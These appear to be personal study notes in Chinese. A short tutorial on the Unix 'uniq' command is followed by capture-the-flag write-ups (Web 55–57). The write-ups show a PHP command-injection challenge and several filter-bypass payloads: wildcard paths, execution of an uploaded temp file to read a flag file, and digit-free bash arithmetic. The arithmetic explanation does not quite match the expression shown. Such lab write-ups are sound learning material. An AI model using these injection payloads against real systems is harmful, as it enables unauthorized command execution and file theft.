如果文件 `file.txt` 的内容如下：
```
apple
banana
banana
cherry
apple
```
运行 `uniq` 命令：
```bash
uniq file.txt
```
输出：
```
apple
banana
cherry
apple
```
注意：`uniq` 只去除相邻的重复行，因此不会去除最后的 `apple`，因为它不和前一行相邻。

#### 2. 与 `sort` 配合使用去除所有重复行：
```bash
sort file.txt | uniq
```
输出：
```
apple
banana
cherry
```
在这种情况下，`sort` 先对文件排序，保证相同的行相邻，`uniq` 再去除重复的行。

#### 3. 统计每一行出现的次数（`-c` 选项）：
```bash
sort file.txt | uniq -c
```
输出：
```
   2 apple
   2 banana
   1 cherry
```
每一行前面的数字表示该行出现的次数。

#### 4. 只显示重复的行（`-d` 选项）：
```bash
sort file.txt | uniq -d
```
输出：
```
apple
banana
```
只输出文件中出现多次的行。

#### 5. 只显示不重复的行（`-u` 选项）：
```bash
sort file.txt | uniq -u
```
输出：
```
cherry
```
只输出文件中没有重复的行。

### 总结：
- **`uniq`** 是用于删除相邻的重复行的命令。如果文件中有重复行且它们不相邻，通常需要先使用 `sort` 进行排序。
- 可以结合多种选项来统计行数、忽略大小写、输出重复或唯一的行等。
![[Pasted image 20240915203404.png]]
# Web 55
```PHP
<?php  
  
/*  
# -*- coding: utf-8 -*-  
# @Author: Lazzaro  
# @Date:   2020-09-05 20:49:30  
# @Last Modified by:   h1xa  
# @Last Modified time: 2020-09-07 20:03:51  
# @email: h1xa@ctfer.com  
# @link: https://ctfer.com  
  
*/  
  
// 你们在炫技吗？  
if(isset($_GET['c'])){
	$c=$_GET['c'];  
    if(!preg_match("/\;|[a-z]|\`|\%|\x09|\x26|\>|\</i", $c)){
	    system($c);  
    }  
}else{
	highlight_file(__FILE__);  
}
```
`URL/?c=/???/????64%20????.???`
![[Pasted image 20240915203916.png]]
![[Pasted image 20240915203903.png]]
## 第二种方法
https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html
从这篇文章中，学会
1. 利用PHP机制，将一个自定义的`php`文件上传为`/tmp/php{XXXXXX}`文件；
2. 使用`. /tmp/php{XXXXXX}`执行我们的文件。
用Burp Suite抓包的方法来做。
我们的`php`文件先试一下`ls`:
```Shell
#!/bin/bash

ls
```
再试一下`cat`：
```Shell
#!/bin/bash

cat /var/www/html/flag.php
```
需要多send几次：
![[Pasted image 20240916233434.png]]
修改那一行试试（多send几次！）：
![[Pasted image 20240916233650.png]]
# Web 56
跟[[#Web 55#第二种方法]]思路一样，网页还过滤了数字，但是`%20`能够躲过去。
![[Pasted image 20240917070620.png]]
![[Pasted image 20240917070656.png]]
# Web 57
![[Pasted image 20240918071452.png]]
==Attention: ==**flag in `36.php`!!!!**

![[Pasted image 20240918070719.png]]

`$(())` ：代表做一次运算，因为里面为空，也表示值为0返回0
`$(( ~$(()) ))` ：对0作取反运算，值为-1
`$(( $((~$(()))) $((~$(()))) ))`： -1-1，也就是(-1)+(-1)为-2，所以值为-2
`$(( ~$(( $((~$(()))) $((~$(()))) )) ))` ：再对-2做一次取反得到1，所以值为1
故我们在`$(( ~$(( )) ))`里面放37个`$((~$(())))`，得到-37，取反即可得到36:
  `36==$((~~$(($((~~$(())))$((~~$(())))$((~~$(())))$((~~$(())))$((~~$(())))$((~~$(())))$((~~$(())))$((~~$(())))$((~~$(())))$((~~$(())))$((~~$(())))$((~~$(())))$((~~$(())))$((~~$(())))$((~~$(())))$((~~$(())))$((~~$(())))$((~~$(())))$((~~$(())))$((~~$(())))$((~~$(())))$((~~$(())))$((~~$(())))$((~~$(())))$((~~$(())))$((~~$(())))$((~~$(())))$((~~$(())))$((~~$(())))$((~~$(())))$((~~$(())))$((~~$(())))$((~~$(())))$((~~$(())))$((~~$(())))$((~~$(())))$((~~$(())))))))`
  